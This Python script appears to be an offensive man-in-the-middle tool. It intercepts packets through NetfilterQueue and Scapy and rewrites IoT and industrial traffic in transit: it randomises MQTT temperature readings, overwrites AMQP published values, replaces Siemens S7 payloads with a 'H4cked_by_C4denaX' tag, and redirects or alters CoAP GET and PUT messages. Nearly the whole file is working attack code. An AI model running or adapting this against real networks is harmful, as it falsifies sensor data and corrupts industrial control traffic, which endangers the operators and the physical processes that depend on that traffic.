import os,sys,random
from netfilterqueue import NetfilterQueue
from scapy.all import * 
from scapy.layers import *
import re

def cleaner_regex_amqp(string):
    num = True
    result = re.sub("[^0-9]", "", string)
    try:
        result = int(result)
    except:
        num = False

    return result,num


#Analazing and modifying packets
def modify(packet):
    pkt = IP(packet.get_payload())
    #MQTT Manipulation packets
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 1883:
        if pkt.haslayer(Raw):
            load = pkt[TCP][Raw].load
            if load.__contains__(b'temp:'):
                try:
                    print("Empezamos a modificar")
                    load = load.decode("utf-8")
                    temp = load.split(":")[1]
                    load = load.replace(temp,str(random.randint(-5,20)))
                    str.encode(load)
                    pkt[TCP][Raw].load = load
                    print("Paquete modificado")
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                    packet.set_payload(bytes(pkt))
                    print("Se va a enviar el paquete")
                    print(str(packet))
                except Exception as e:
                    print(e)
                    packet.accept()



    #AMQP Manipulation packets
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 5672:
        if pkt.haslayer(Raw):
            load = pkt[TCP][Raw].load
            if load[0] == 2: #Byte 0 indicates the type of message (2 == publish_message)
                long = load[28]
                num = load[29:29+long]
                mod_num = bytes(chr(int(num.decode('utf-8'))).encode()*long)
                print(mod_num)
                load = bytes(load[:29])+mod_num+b'\xce' #Make the new load 
                pkt[TCP][Raw].load = load
                print("Paquete modificado")
                #Resets the checksum to avoid problems
                del pkt[IP].chksum
                del pkt[TCP].chksum
                #Change the original packet
                packet.set_payload(bytes(pkt))
                print("Se va a enviar el paquete")
                print(str(packet))
    
    #S7 Manipulation packets
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 1102:
        print(pkt[TCP].show())
        if pkt.haslayer(Raw):
            load = pkt[TCP][Raw].load
            if len(load) > 50:
                print(len(load))
                print("Al terminar" + str(load[35:]))
                load = bytes(load[:35]) + 'H4cked_by_C4denaX_;P'.encode()
                pkt[TCP][Raw].load = load
                del pkt[IP].chksum
                del pkt[TCP].chksum
                packet.set_payload(bytes(pkt))
                print("Se envia el nuevo paquete")
                print(str(packet))
    #COAP Packet Manipulation of Get and Put Methods
    if pkt.haslayer(UDP) and pkt.getlayer(UDP).dport == 5683:
        orig_load = pkt[UDP][Raw].load
        #If message is typed as GET message
        if orig_load[1] == 1:
            #print(pkt[UDP].show())
            final_directory = b'\xb4time' #New direction of get method (Load was studied before to get this byte secuence)
            final_load = orig_load[:6] + final_directory
            pkt[UDP][Raw].load = final_load
            #First update and modified the new length of the packet to avoid retransmissions
            pkt[UDP].len = pkt[UDP].len - abs(len(orig_load)-len(final_load))
            pkt[IP].len = pkt[IP].len - abs(len(orig_load)-len(final_load))
            print("Paquete modificado")
            #Resets the checksum to avoid problems
            del pkt[IP].chksum
            del pkt[UDP].chksum
            #Change the original packet
            packet.set_payload(bytes(pkt))
            print("Se va a enviar el paquete")
            print(str(packet))
        #If message is typed as PUT message     
        if orig_load[1] == 3:
            new_payload = b'This payload has no be modified by a cracker:D' #The message has the same len to avoid changing the len of the total message
            final_load= orig_load[:19] + new_payload
            pkt[UDP][Raw].load = final_load
            print("Paquete modificado")
            #Resets the checksum to avoid problems
            del pkt[IP].chksum
            del pkt[UDP].chksum
            #Change the original packet
            packet.set_payload(bytes(pkt))
            print("Se va a enviar el paquete")
            print(str(packet))
      
    packet.accept()



#Main function 
if __name__ == "__main__":
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, modify)
    try:
        print ("[*] waiting for data")
        nfqueue.run()
    except KeyboardInterrupt:
        nfqueue.unbind()
    
